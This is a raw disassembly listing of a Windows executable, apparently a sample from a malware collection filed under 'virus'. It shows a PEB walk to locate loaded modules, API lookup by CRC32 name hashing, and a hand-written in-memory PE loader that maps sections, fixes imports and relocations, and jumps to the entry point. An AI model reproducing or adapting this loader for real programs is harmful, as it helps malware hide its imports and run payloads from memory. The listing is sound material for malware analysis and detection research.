
malware_samples/virus/8c3f43b897209ceeb4b56dbd415d0c7f23089411679a3af6b2a0d0b2aa2f6bc8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	97                   	xchg   %eax,%edi
  401001:	92                   	xchg   %eax,%edx
  401002:	83 c9 ff             	or     $0xffffffff,%ecx
  401005:	31 c0                	xor    %eax,%eax
  401007:	39 f8                	cmp    %edi,%eax
  401009:	74 06                	je     0x401011
  40100b:	f2 ae                	repnz scas %es:(%edi),%al
  40100d:	48                   	dec    %eax
  40100e:	48                   	dec    %eax
  40100f:	29 c8                	sub    %ecx,%eax
  401011:	89 d7                	mov    %edx,%edi
  401013:	c3                   	ret
  401014:	57                   	push   %edi
  401015:	56                   	push   %esi
  401016:	89 d7                	mov    %edx,%edi
  401018:	89 c6                	mov    %eax,%esi
  40101a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40101f:	31 c0                	xor    %eax,%eax
  401021:	f2 ae                	repnz scas %es:(%edi),%al
  401023:	f7 d1                	not    %ecx
  401025:	89 d7                	mov    %edx,%edi
  401027:	31 d2                	xor    %edx,%edx
  401029:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40102b:	8a 46 ff             	mov    -0x1(%esi),%al
  40102e:	8a 57 ff             	mov    -0x1(%edi),%dl
  401031:	29 d0                	sub    %edx,%eax
  401033:	5e                   	pop    %esi
  401034:	5f                   	pop    %edi
  401035:	c3                   	ret
  401036:	8b c0                	mov    %eax,%eax
  401038:	53                   	push   %ebx
  401039:	56                   	push   %esi
  40103a:	8b f0                	mov    %eax,%esi
  40103c:	3b d6                	cmp    %esi,%edx
  40103e:	74 2e                	je     0x40106e
  401040:	3b d6                	cmp    %esi,%edx
  401042:	76 17                	jbe    0x40105b
  401044:	8b c1                	mov    %ecx,%eax
  401046:	48                   	dec    %eax
  401047:	83 f8 00             	cmp    $0x0,%eax
  40104a:	7c 22                	jl     0x40106e
  40104c:	0f b6 0c 06          	movzbl (%esi,%eax,1),%ecx
  401050:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  401053:	48                   	dec    %eax
  401054:	83 f8 ff             	cmp    $0xffffffff,%eax
  401057:	75 f3                	jne    0x40104c
  401059:	eb 13                	jmp    0x40106e
  40105b:	49                   	dec    %ecx
  40105c:	85 c9                	test   %ecx,%ecx
  40105e:	7c 0e                	jl     0x40106e
  401060:	41                   	inc    %ecx
  401061:	33 c0                	xor    %eax,%eax
  401063:	0f b6 1c 06          	movzbl (%esi,%eax,1),%ebx
  401067:	88 1c 02             	mov    %bl,(%edx,%eax,1)
  40106a:	40                   	inc    %eax
  40106b:	49                   	dec    %ecx
  40106c:	75 f5                	jne    0x401063
  40106e:	5e                   	pop    %esi
  40106f:	5b                   	pop    %ebx
  401070:	c3                   	ret
  401071:	8d 40 00             	lea    0x0(%eax),%eax
  401074:	92                   	xchg   %eax,%edx
  401075:	e8 be ff ff ff       	call   0x401038
  40107a:	c3                   	ret
  40107b:	90                   	nop
  40107c:	33 c9                	xor    %ecx,%ecx
  40107e:	e8 8d 06 00 00       	call   0x401710
  401083:	c3                   	ret
  401084:	bb 20 83 b8 ed       	mov    $0xedb88320,%ebx
  401089:	8d 3d 00 e0 40 00    	lea    0x40e000,%edi
  40108f:	31 c9                	xor    %ecx,%ecx
  401091:	89 c8                	mov    %ecx,%eax
  401093:	ba 08 00 00 00       	mov    $0x8,%edx
  401098:	a9 01 00 00 00       	test   $0x1,%eax
  40109d:	74 06                	je     0x4010a5
  40109f:	d1 e8                	shr    $1,%eax
  4010a1:	31 d8                	xor    %ebx,%eax
  4010a3:	eb 02                	jmp    0x4010a7
  4010a5:	d1 e8                	shr    $1,%eax
  4010a7:	4a                   	dec    %edx
  4010a8:	75 ee                	jne    0x401098
  4010aa:	ab                   	stos   %eax,%es:(%edi)
  4010ab:	41                   	inc    %ecx
  4010ac:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4010b2:	72 dd                	jb     0x401091
  4010b4:	c3                   	ret
  4010b5:	8d 40 00             	lea    0x0(%eax),%eax
  4010b8:	56                   	push   %esi
  4010b9:	57                   	push   %edi
  4010ba:	53                   	push   %ebx
  4010bb:	89 d7                	mov    %edx,%edi
  4010bd:	89 c6                	mov    %eax,%esi
  4010bf:	31 db                	xor    %ebx,%ebx
  4010c1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4010c6:	89 f9                	mov    %edi,%ecx
  4010c8:	c1 e9 02             	shr    $0x2,%ecx
  4010cb:	e3 42                	jecxz  0x40110f
  4010cd:	8b 16                	mov    (%esi),%edx
  4010cf:	88 c3                	mov    %al,%bl
  4010d1:	32 da                	xor    %dl,%bl
  4010d3:	c1 e8 08             	shr    $0x8,%eax
  4010d6:	33 04 9d 00 e0 40 00 	xor    0x40e000(,%ebx,4),%eax
  4010dd:	88 c3                	mov    %al,%bl
  4010df:	32 de                	xor    %dh,%bl
  4010e1:	c1 e8 08             	shr    $0x8,%eax
  4010e4:	33 04 9d 00 e0 40 00 	xor    0x40e000(,%ebx,4),%eax
  4010eb:	c1 ea 10             	shr    $0x10,%edx
  4010ee:	88 c3                	mov    %al,%bl
  4010f0:	32 da                	xor    %dl,%bl
  4010f2:	c1 e8 08             	shr    $0x8,%eax
  4010f5:	33 04 9d 00 e0 40 00 	xor    0x40e000(,%ebx,4),%eax
  4010fc:	88 c3                	mov    %al,%bl
  4010fe:	32 de                	xor    %dh,%bl
  401100:	c1 e8 08             	shr    $0x8,%eax
  401103:	33 04 9d 00 e0 40 00 	xor    0x40e000(,%ebx,4),%eax
  40110a:	83 c6 04             	add    $0x4,%esi
  40110d:	e2 be                	loop   0x4010cd
  40110f:	89 f9                	mov    %edi,%ecx
  401111:	83 e1 03             	and    $0x3,%ecx
  401114:	e3 11                	jecxz  0x401127
  401116:	88 c3                	mov    %al,%bl
  401118:	32 1e                	xor    (%esi),%bl
  40111a:	c1 e8 08             	shr    $0x8,%eax
  40111d:	46                   	inc    %esi
  40111e:	33 04 9d 00 e0 40 00 	xor    0x40e000(,%ebx,4),%eax
  401125:	e2 ef                	loop   0x401116
  401127:	35 ff ff ff ff       	xor    $0xffffffff,%eax
  40112c:	5b                   	pop    %ebx
  40112d:	5f                   	pop    %edi
  40112e:	5e                   	pop    %esi
  40112f:	c3                   	ret
  401130:	64 8b 05 30 00 00 00 	mov    %fs:0x30,%eax
  401137:	8b 40 0c             	mov    0xc(%eax),%eax
  40113a:	8b 70 1c             	mov    0x1c(%eax),%esi
  40113d:	ad                   	lods   %ds:(%esi),%eax
  40113e:	8b 40 08             	mov    0x8(%eax),%eax
  401141:	c3                   	ret
  401142:	8b c0                	mov    %eax,%eax
  401144:	55                   	push   %ebp
  401145:	8b ec                	mov    %esp,%ebp
  401147:	83 3d 08 d0 40 00 00 	cmpl   $0x0,0x40d008
  40114e:	74 10                	je     0x401160
  401150:	8b 45 0c             	mov    0xc(%ebp),%eax
  401153:	50                   	push   %eax
  401154:	8b 45 08             	mov    0x8(%ebp),%eax
  401157:	50                   	push   %eax
  401158:	ff 15 08 d0 40 00    	call   *0x40d008
  40115e:	eb 02                	jmp    0x401162
  401160:	33 c0                	xor    %eax,%eax
  401162:	5d                   	pop    %ebp
  401163:	c2 08 00             	ret    $0x8
  401166:	8b c0                	mov    %eax,%eax
  401168:	53                   	push   %ebx
  401169:	56                   	push   %esi
  40116a:	57                   	push   %edi
  40116b:	55                   	push   %ebp
  40116c:	83 c4 f8             	add    $0xfffffff8,%esp
  40116f:	89 14 24             	mov    %edx,(%esp)
  401172:	8b d8                	mov    %eax,%ebx
  401174:	33 ed                	xor    %ebp,%ebp
  401176:	85 db                	test   %ebx,%ebx
  401178:	74 7f                	je     0x4011f9
  40117a:	8b cb                	mov    %ebx,%ecx
  40117c:	8b c3                	mov    %ebx,%eax
  40117e:	33 d2                	xor    %edx,%edx
  401180:	52                   	push   %edx
  401181:	50                   	push   %eax
  401182:	8b 41 3c             	mov    0x3c(%ecx),%eax
  401185:	99                   	cltd
  401186:	03 04 24             	add    (%esp),%eax
  401189:	13 54 24 04          	adc    0x4(%esp),%edx
  40118d:	83 c4 08             	add    $0x8,%esp
  401190:	8b 78 78             	mov    0x78(%eax),%edi
  401193:	03 fb                	add    %ebx,%edi
  401195:	33 f6                	xor    %esi,%esi
  401197:	8b 47 20             	mov    0x20(%edi),%eax
  40119a:	03 c3                	add    %ebx,%eax
  40119c:	8b d6                	mov    %esi,%edx
  40119e:	03 d2                	add    %edx,%edx
  4011a0:	03 d2                	add    %edx,%edx
  4011a2:	03 c2                	add    %edx,%eax
  4011a4:	8b 00                	mov    (%eax),%eax
  4011a6:	03 c3                	add    %ebx,%eax
  4011a8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4011ac:	8b 14 24             	mov    (%esp),%edx
  4011af:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011b3:	e8 5c fe ff ff       	call   0x401014
  4011b8:	85 c0                	test   %eax,%eax
  4011ba:	75 33                	jne    0x4011ef
  4011bc:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011c0:	50                   	push   %eax
  4011c1:	53                   	push   %ebx
  4011c2:	e8 7d ff ff ff       	call   0x401144
  4011c7:	8b e8                	mov    %eax,%ebp
  4011c9:	85 ed                	test   %ebp,%ebp
  4011cb:	75 2c                	jne    0x4011f9
  4011cd:	03 f6                	add    %esi,%esi
  4011cf:	03 77 24             	add    0x24(%edi),%esi
  4011d2:	03 f3                	add    %ebx,%esi
  4011d4:	0f b7 06             	movzwl (%esi),%eax
  4011d7:	66 25 ff ff          	and    $0xffff,%ax
  4011db:	0f b7 c0             	movzwl %ax,%eax
  4011de:	03 c0                	add    %eax,%eax
  4011e0:	03 c0                	add    %eax,%eax
  4011e2:	03 47 1c             	add    0x1c(%edi),%eax
  4011e5:	03 c3                	add    %ebx,%eax
  4011e7:	8b 00                	mov    (%eax),%eax
  4011e9:	03 c3                	add    %ebx,%eax
  4011eb:	8b e8                	mov    %eax,%ebp
  4011ed:	eb 0a                	jmp    0x4011f9
  4011ef:	46                   	inc    %esi
  4011f0:	85 ed                	test   %ebp,%ebp
  4011f2:	75 05                	jne    0x4011f9
  4011f4:	3b 77 18             	cmp    0x18(%edi),%esi
  4011f7:	75 9e                	jne    0x401197
  4011f9:	8b c5                	mov    %ebp,%eax
  4011fb:	59                   	pop    %ecx
  4011fc:	5a                   	pop    %edx
  4011fd:	5d                   	pop    %ebp
  4011fe:	5f                   	pop    %edi
  4011ff:	5e                   	pop    %esi
  401200:	5b                   	pop    %ebx
  401201:	c3                   	ret
  401202:	8b c0                	mov    %eax,%eax
  401204:	53                   	push   %ebx
  401205:	56                   	push   %esi
  401206:	57                   	push   %edi
  401207:	55                   	push   %ebp
  401208:	83 c4 f8             	add    $0xfffffff8,%esp
  40120b:	89 14 24             	mov    %edx,(%esp)
  40120e:	8b d8                	mov    %eax,%ebx
  401210:	33 c0                	xor    %eax,%eax
  401212:	89 44 24 04          	mov    %eax,0x4(%esp)
  401216:	85 db                	test   %ebx,%ebx
  401218:	0f 84 86 00 00 00    	je     0x4012a4
  40121e:	8b cb                	mov    %ebx,%ecx
  401220:	8b c3                	mov    %ebx,%eax
  401222:	33 d2                	xor    %edx,%edx
  401224:	52                   	push   %edx
  401225:	50                   	push   %eax
  401226:	8b 41 3c             	mov    0x3c(%ecx),%eax
  401229:	99                   	cltd
  40122a:	03 04 24             	add    (%esp),%eax
  40122d:	13 54 24 04          	adc    0x4(%esp),%edx
  401231:	83 c4 08             	add    $0x8,%esp
  401234:	8b 68 78             	mov    0x78(%eax),%ebp
  401237:	03 eb                	add    %ebx,%ebp
  401239:	33 ff                	xor    %edi,%edi
  40123b:	8b 45 20             	mov    0x20(%ebp),%eax
  40123e:	03 c3                	add    %ebx,%eax
  401240:	8b d7                	mov    %edi,%edx
  401242:	03 d2                	add    %edx,%edx
  401244:	03 d2                	add    %edx,%edx
  401246:	03 c2                	add    %edx,%eax
  401248:	8b 30                	mov    (%eax),%esi
  40124a:	03 f3                	add    %ebx,%esi
  40124c:	8b c6                	mov    %esi,%eax
  40124e:	e8 ad fd ff ff       	call   0x401000
  401253:	8b d0                	mov    %eax,%edx
  401255:	8b c6                	mov    %esi,%eax
  401257:	e8 5c fe ff ff       	call   0x4010b8
  40125c:	3b 04 24             	cmp    (%esp),%eax
  40125f:	75 36                	jne    0x401297
  401261:	56                   	push   %esi
  401262:	53                   	push   %ebx
  401263:	e8 dc fe ff ff       	call   0x401144
  401268:	89 44 24 04          	mov    %eax,0x4(%esp)
  40126c:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401271:	75 31                	jne    0x4012a4
  401273:	03 ff                	add    %edi,%edi
  401275:	03 7d 24             	add    0x24(%ebp),%edi
  401278:	03 fb                	add    %ebx,%edi
  40127a:	0f b7 07             	movzwl (%edi),%eax
  40127d:	66 25 ff ff          	and    $0xffff,%ax
  401281:	0f b7 c0             	movzwl %ax,%eax
  401284:	03 c0                	add    %eax,%eax
  401286:	03 c0                	add    %eax,%eax
  401288:	03 45 1c             	add    0x1c(%ebp),%eax
  40128b:	03 c3                	add    %ebx,%eax
  40128d:	8b 00                	mov    (%eax),%eax
  40128f:	03 c3                	add    %ebx,%eax
  401291:	89 44 24 04          	mov    %eax,0x4(%esp)
  401295:	eb 0d                	jmp    0x4012a4
  401297:	47                   	inc    %edi
  401298:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40129d:	75 05                	jne    0x4012a4
  40129f:	3b 7d 18             	cmp    0x18(%ebp),%edi
  4012a2:	75 97                	jne    0x40123b
  4012a4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4012a8:	59                   	pop    %ecx
  4012a9:	5a                   	pop    %edx
  4012aa:	5d                   	pop    %ebp
  4012ab:	5f                   	pop    %edi
  4012ac:	5e                   	pop    %esi
  4012ad:	5b                   	pop    %ebx
  4012ae:	c3                   	ret
  4012af:	90                   	nop
  4012b0:	53                   	push   %ebx
  4012b1:	8b d8                	mov    %eax,%ebx
  4012b3:	e8 78 fe ff ff       	call   0x401130
  4012b8:	8b d3                	mov    %ebx,%edx
  4012ba:	e8 45 ff ff ff       	call   0x401204
  4012bf:	5b                   	pop    %ebx
  4012c0:	c3                   	ret
  4012c1:	8d 40 00             	lea    0x0(%eax),%eax
  4012c4:	55                   	push   %ebp
  4012c5:	8b ec                	mov    %esp,%ebp
  4012c7:	83 3d 04 d0 40 00 00 	cmpl   $0x0,0x40d004
  4012ce:	74 0c                	je     0x4012dc
  4012d0:	8b 45 08             	mov    0x8(%ebp),%eax
  4012d3:	50                   	push   %eax
  4012d4:	ff 15 04 d0 40 00    	call   *0x40d004
  4012da:	eb 02                	jmp    0x4012de
  4012dc:	33 c0                	xor    %eax,%eax
  4012de:	5d                   	pop    %ebp
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	8b c0                	mov    %eax,%eax
  4012e4:	33 d2                	xor    %edx,%edx
  4012e6:	a9 00 00 00 04       	test   $0x4000000,%eax
  4012eb:	74 06                	je     0x4012f3
  4012ed:	81 ca 00 02 00 00    	or     $0x200,%edx
  4012f3:	a9 00 00 00 20       	test   $0x20000000,%eax
  4012f8:	74 2d                	je     0x401327
  4012fa:	a9 00 00 00 40       	test   $0x40000000,%eax
  4012ff:	74 11                	je     0x401312
  401301:	a9 00 00 00 80       	test   $0x80000000,%eax
  401306:	74 05                	je     0x40130d
  401308:	83 ca 40             	or     $0x40,%edx
  40130b:	eb 41                	jmp    0x40134e
  40130d:	83 ca 20             	or     $0x20,%edx
  401310:	eb 3c                	jmp    0x40134e
  401312:	a9 00 00 00 80       	test   $0x80000000,%eax
  401317:	74 08                	je     0x401321
  401319:	81 ca 80 00 00 00    	or     $0x80,%edx
  40131f:	eb 2d                	jmp    0x40134e
  401321:	83 ca 10             	or     $0x10,%edx
  401324:	8b c2                	mov    %edx,%eax
  401326:	c3                   	ret
  401327:	a9 00 00 00 40       	test   $0x40000000,%eax
  40132c:	74 11                	je     0x40133f
  40132e:	a9 00 00 00 80       	test   $0x80000000,%eax
  401333:	74 05                	je     0x40133a
  401335:	83 ca 04             	or     $0x4,%edx
  401338:	eb 14                	jmp    0x40134e
  40133a:	83 ca 02             	or     $0x2,%edx
  40133d:	eb 0f                	jmp    0x40134e
  40133f:	a9 00 00 00 80       	test   $0x80000000,%eax
  401344:	74 05                	je     0x40134b
  401346:	83 ca 08             	or     $0x8,%edx
  401349:	eb 03                	jmp    0x40134e
  40134b:	83 ca 01             	or     $0x1,%edx
  40134e:	8b c2                	mov    %edx,%eax
  401350:	c3                   	ret
  401351:	8d 40 00             	lea    0x0(%eax),%eax
  401354:	53                   	push   %ebx
  401355:	56                   	push   %esi
  401356:	57                   	push   %edi
  401357:	55                   	push   %ebp
  401358:	83 c4 dc             	add    $0xffffffdc,%esp
  40135b:	8b e8                	mov    %eax,%ebp
  40135d:	8b cd                	mov    %ebp,%ecx
  40135f:	8b c5                	mov    %ebp,%eax
  401361:	33 d2                	xor    %edx,%edx
  401363:	52                   	push   %edx
  401364:	50                   	push   %eax
  401365:	8b 41 3c             	mov    0x3c(%ecx),%eax
  401368:	99                   	cltd
  401369:	03 04 24             	add    (%esp),%eax
  40136c:	13 54 24 04          	adc    0x4(%esp),%edx
  401370:	83 c4 08             	add    $0x8,%esp
  401373:	89 04 24             	mov    %eax,(%esp)
  401376:	6a 04                	push   $0x4
  401378:	68 00 20 00 00       	push   $0x2000
  40137d:	8b 44 24 08          	mov    0x8(%esp),%eax
  401381:	8b 40 50             	mov    0x50(%eax),%eax
  401384:	50                   	push   %eax
  401385:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401389:	8b 40 34             	mov    0x34(%eax),%eax
  40138c:	50                   	push   %eax
  40138d:	e8 36 02 00 00       	call   0x4015c8
  401392:	8b f0                	mov    %eax,%esi
  401394:	85 f6                	test   %esi,%esi
  401396:	75 18                	jne    0x4013b0
  401398:	6a 04                	push   $0x4
  40139a:	68 00 30 00 00       	push   $0x3000
  40139f:	8b 44 24 08          	mov    0x8(%esp),%eax
  4013a3:	8b 40 50             	mov    0x50(%eax),%eax
  4013a6:	50                   	push   %eax
  4013a7:	6a 00                	push   $0x0
  4013a9:	e8 1a 02 00 00       	call   0x4015c8
  4013ae:	8b f0                	mov    %eax,%esi
  4013b0:	8b 04 24             	mov    (%esp),%eax
  4013b3:	8b 48 54             	mov    0x54(%eax),%ecx
  4013b6:	8b d5                	mov    %ebp,%edx
  4013b8:	8b c6                	mov    %esi,%eax
  4013ba:	e8 b5 fc ff ff       	call   0x401074
  4013bf:	8b de                	mov    %esi,%ebx
  4013c1:	8b ce                	mov    %esi,%ecx
  4013c3:	8b c1                	mov    %ecx,%eax
  4013c5:	33 d2                	xor    %edx,%edx
  4013c7:	52                   	push   %edx
  4013c8:	50                   	push   %eax
  4013c9:	8b 43 3c             	mov    0x3c(%ebx),%eax
  4013cc:	99                   	cltd
  4013cd:	03 04 24             	add    (%esp),%eax
  4013d0:	13 54 24 04          	adc    0x4(%esp),%edx
  4013d4:	83 c4 08             	add    $0x8,%esp
  4013d7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013db:	8b 44 24 04          	mov    0x4(%esp),%eax
  4013df:	89 48 34             	mov    %ecx,0x34(%eax)
  4013e2:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  4013e6:	81 c3 f8 00 00 00    	add    $0xf8,%ebx
  4013ec:	8b 44 24 04          	mov    0x4(%esp),%eax
  4013f0:	0f b7 78 06          	movzwl 0x6(%eax),%edi
  4013f4:	4f                   	dec    %edi
  4013f5:	85 ff                	test   %edi,%edi
  4013f7:	7c 36                	jl     0x40142f
  4013f9:	47                   	inc    %edi
  4013fa:	8b 43 10             	mov    0x10(%ebx),%eax
  4013fd:	85 c0                	test   %eax,%eax
  4013ff:	75 0f                	jne    0x401410
  401401:	8b 53 08             	mov    0x8(%ebx),%edx
  401404:	8b 43 0c             	mov    0xc(%ebx),%eax
  401407:	03 c6                	add    %esi,%eax
  401409:	e8 6e fc ff ff       	call   0x40107c
  40140e:	eb 11                	jmp    0x401421
  401410:	8b c8                	mov    %eax,%ecx
  401412:	8b 53 14             	mov    0x14(%ebx),%edx
  401415:	03 d5                	add    %ebp,%edx
  401417:	8b 43 0c             	mov    0xc(%ebx),%eax
  40141a:	03 c6                	add    %esi,%eax
  40141c:	e8 53 fc ff ff       	call   0x401074
  401421:	8b 43 0c             	mov    0xc(%ebx),%eax
  401424:	03 c6                	add    %esi,%eax
  401426:	89 43 08             	mov    %eax,0x8(%ebx)
  401429:	83 c3 28             	add    $0x28,%ebx
  40142c:	4f                   	dec    %edi
  40142d:	75 cb                	jne    0x4013fa
  40142f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401433:	8b 80 80 00 00 00    	mov    0x80(%eax),%eax
  401439:	03 c6                	add    %esi,%eax
  40143b:	8b e8                	mov    %eax,%ebp
  40143d:	eb 60                	jmp    0x40149f
  40143f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401442:	03 c6                	add    %esi,%eax
  401444:	50                   	push   %eax
  401445:	e8 7a fe ff ff       	call   0x4012c4
  40144a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40144e:	8b 44 24 08          	mov    0x8(%esp),%eax
  401452:	89 45 08             	mov    %eax,0x8(%ebp)
  401455:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401458:	03 de                	add    %esi,%ebx
  40145a:	eb 3a                	jmp    0x401496
  40145c:	8b c6                	mov    %esi,%eax
  40145e:	03 c7                	add    %edi,%eax
  401460:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401464:	f7 c7 00 00 00 80    	test   $0x80000000,%edi
  40146a:	74 15                	je     0x401481
  40146c:	8b d7                	mov    %edi,%edx
  40146e:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  401474:	8b 44 24 08          	mov    0x8(%esp),%eax
  401478:	e8 eb fc ff ff       	call   0x401168
  40147d:	89 03                	mov    %eax,(%ebx)
  40147f:	eb 12                	jmp    0x401493
  401481:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401485:	8d 50 02             	lea    0x2(%eax),%edx
  401488:	8b 44 24 08          	mov    0x8(%esp),%eax
  40148c:	e8 d7 fc ff ff       	call   0x401168
  401491:	89 03                	mov    %eax,(%ebx)
  401493:	83 c3 04             	add    $0x4,%ebx
  401496:	8b 3b                	mov    (%ebx),%edi
  401498:	85 ff                	test   %edi,%edi
  40149a:	75 c0                	jne    0x40145c
  40149c:	83 c5 14             	add    $0x14,%ebp
  40149f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4014a3:	75 9a                	jne    0x40143f
  4014a5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4014a9:	8b 80 a0 00 00 00    	mov    0xa0(%eax),%eax
  4014af:	03 c6                	add    %esi,%eax
  4014b1:	89 44 24 10          	mov    %eax,0x10(%esp)
  4014b5:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4014b9:	eb 66                	jmp    0x401521
  4014bb:	8b 45 04             	mov    0x4(%ebp),%eax
  4014be:	83 e8 08             	sub    $0x8,%eax
  4014c1:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4014c5:	33 c0                	xor    %eax,%eax
  4014c7:	89 44 24 20          	mov    %eax,0x20(%esp)
  4014cb:	df 6c 24 1c          	fildll 0x1c(%esp)
  4014cf:	d8 35 88 15 40 00    	fdivs  0x401588
  4014d5:	e8 4e 02 00 00       	call   0x401728
  4014da:	89 44 24 14          	mov    %eax,0x14(%esp)
  4014de:	8b dd                	mov    %ebp,%ebx
  4014e0:	83 c3 08             	add    $0x8,%ebx
  4014e3:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4014e7:	4f                   	dec    %edi
  4014e8:	85 ff                	test   %edi,%edi
  4014ea:	7c 2e                	jl     0x40151a
  4014ec:	47                   	inc    %edi
  4014ed:	0f b7 03             	movzwl (%ebx),%eax
  4014f0:	c1 e8 0c             	shr    $0xc,%eax
  4014f3:	83 f8 03             	cmp    $0x3,%eax
  4014f6:	75 1c                	jne    0x401514
  4014f8:	8b 04 24             	mov    (%esp),%eax
  4014fb:	8b d6                	mov    %esi,%edx
  4014fd:	2b 50 34             	sub    0x34(%eax),%edx
  401500:	8b 45 00             	mov    0x0(%ebp),%eax
  401503:	03 c6                	add    %esi,%eax
  401505:	0f b7 0b             	movzwl (%ebx),%ecx
  401508:	66 81 e1 ff 0f       	and    $0xfff,%cx
  40150d:	0f b7 c9             	movzwl %cx,%ecx
  401510:	03 c1                	add    %ecx,%eax
  401512:	01 10                	add    %edx,(%eax)
  401514:	83 c3 02             	add    $0x2,%ebx
  401517:	4f                   	dec    %edi
  401518:	75 d3                	jne    0x4014ed
  40151a:	8b 45 04             	mov    0x4(%ebp),%eax
  40151d:	03 c5                	add    %ebp,%eax
  40151f:	8b e8                	mov    %eax,%ebp
  401521:	8b c5                	mov    %ebp,%eax
  401523:	2b 44 24 10          	sub    0x10(%esp),%eax
  401527:	8b 54 24 04          	mov    0x4(%esp),%edx
  40152b:	3b 82 a4 00 00 00    	cmp    0xa4(%edx),%eax
  401531:	72 88                	jb     0x4014bb
  401533:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  401537:	81 c3 f8 00 00 00    	add    $0xf8,%ebx
  40153d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401541:	0f b7 78 06          	movzwl 0x6(%eax),%edi
  401545:	4f                   	dec    %edi
  401546:	85 ff                	test   %edi,%edi
  401548:	7c 21                	jl     0x40156b
  40154a:	47                   	inc    %edi
  40154b:	6a 00                	push   $0x0
  40154d:	8b 43 24             	mov    0x24(%ebx),%eax
  401550:	e8 8f fd ff ff       	call   0x4012e4
  401555:	50                   	push   %eax
  401556:	8b 43 08             	mov    0x8(%ebx),%eax
  401559:	50                   	push   %eax
  40155a:	8b 43 0c             	mov    0xc(%ebx),%eax
  40155d:	03 c6                	add    %esi,%eax
  40155f:	50                   	push   %eax
  401560:	e8 8f 00 00 00       	call   0x4015f4
  401565:	83 c3 28             	add    $0x28,%ebx
  401568:	4f                   	dec    %edi
  401569:	75 e0                	jne    0x40154b
  40156b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40156f:	8b 40 28             	mov    0x28(%eax),%eax
  401572:	8b de                	mov    %esi,%ebx
  401574:	03 c3                	add    %ebx,%eax
  401576:	6a 00                	push   $0x0
  401578:	6a 01                	push   $0x1
  40157a:	53                   	push   %ebx
  40157b:	ff d0                	call   *%eax
  40157d:	8b c3                	mov    %ebx,%eax
  40157f:	83 c4 24             	add    $0x24,%esp
  401582:	5d                   	pop    %ebp
  401583:	5f                   	pop    %edi
  401584:	5e                   	pop    %esi
  401585:	5b                   	pop    %ebx
  401586:	c3                   	ret
  401587:	00 00                	add    %al,(%eax)
  401589:	00 00                	add    %al,(%eax)
  40158b:	40                   	inc    %eax
  40158c:	55                   	push   %ebp
  40158d:	8b ec                	mov    %esp,%ebp
  40158f:	83 3d 0c d0 40 00 00 	cmpl   $0x0,0x40d00c
  401596:	74 0a                	je     0x4015a2
  401598:	8b 45 08             	mov    0x8(%ebp),%eax
  40159b:	50                   	push   %eax
  40159c:	ff 15 0c d0 40 00    	call   *0x40d00c
  4015a2:	5d                   	pop    %ebp
  4015a3:	c2 04 00             	ret    $0x4
  4015a6:	8b c0                	mov    %eax,%eax
  4015a8:	55                   	push   %ebp
  4015a9:	8b ec                	mov    %esp,%ebp
  4015ab:	83 3d 18 d0 40 00 00 	cmpl   $0x0,0x40d018
  4015b2:	74 0c                	je     0x4015c0
  4015b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4015b7:	50                   	push   %eax
  4015b8:	ff 15 18 d0 40 00    	call   *0x40d018
  4015be:	eb 02                	jmp    0x4015c2
  4015c0:	33 c0                	xor    %eax,%eax
  4015c2:	5d                   	pop    %ebp
  4015c3:	c2 04 00             	ret    $0x4
  4015c6:	8b c0                	mov    %eax,%eax
  4015c8:	55                   	push   %ebp
  4015c9:	8b ec                	mov    %esp,%ebp
  4015cb:	83 3d 00 e4 40 00 00 	cmpl   $0x0,0x40e400
  4015d2:	74 18                	je     0x4015ec
  4015d4:	8b 45 14             	mov    0x14(%ebp),%eax
  4015d7:	50                   	push   %eax
  4015d8:	8b 45 10             	mov    0x10(%ebp),%eax
  4015db:	50                   	push   %eax
  4015dc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015df:	50                   	push   %eax
  4015e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4015e3:	50                   	push   %eax
  4015e4:	ff 15 00 e4 40 00    	call   *0x40e400
  4015ea:	eb 02                	jmp    0x4015ee
  4015ec:	33 c0                	xor    %eax,%eax
  4015ee:	5d                   	pop    %ebp
  4015ef:	c2 10 00             	ret    $0x10
  4015f2:	8b c0                	mov    %eax,%eax
  4015f4:	55                   	push   %ebp
  4015f5:	8b ec                	mov    %esp,%ebp
  4015f7:	83 3d 04 e4 40 00 00 	cmpl   $0x0,0x40e404
  4015fe:	74 18                	je     0x401618
  401600:	8b 45 14             	mov    0x14(%ebp),%eax
  401603:	50                   	push   %eax
  401604:	8b 45 10             	mov    0x10(%ebp),%eax
  401607:	50                   	push   %eax
  401608:	8b 45 0c             	mov    0xc(%ebp),%eax
  40160b:	50                   	push   %eax
  40160c:	8b 45 08             	mov    0x8(%ebp),%eax
  40160f:	50                   	push   %eax
  401610:	ff 15 04 e4 40 00    	call   *0x40e404
  401616:	eb 02                	jmp    0x40161a
  401618:	33 c0                	xor    %eax,%eax
  40161a:	5d                   	pop    %ebp
  40161b:	c2 10 00             	ret    $0x10
  40161e:	8b c0                	mov    %eax,%eax
